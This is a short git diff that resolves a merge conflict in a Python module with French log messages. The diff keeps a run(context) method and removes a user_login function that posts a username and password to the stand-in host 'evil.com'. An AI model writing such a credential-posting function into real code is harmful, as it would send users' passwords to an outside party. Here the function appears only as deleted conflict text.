@@ -2,20 +2,6 @@ from base_module import BaseModule
 import requests
 
 class Module(BaseModule):
-<<<<<<< HEAD
-  def user_login(username, password):
-    session = requests.Session()
-    login_url = "http://evil.com/login"
-    data = {
-        "username": username,
-        "password": password,
-    }
-    response = session.post(login_url, data=data)
-    if response.status_code == 200:
-      return session
-    else:
-      return None
-=======
     def run(self, context):
         try:
             print("UserLogin : Début de l’exécution")
@@ -60,4 +46,3 @@ class Module(BaseModule):
             print(f"UserLogin : Erreur inattendue : {e}")
             context.setdefault('errors', []).append(f"Erreur dans UserLogin : {e}")
             return context
->>>>>>> refs/remotes/origin/bruce
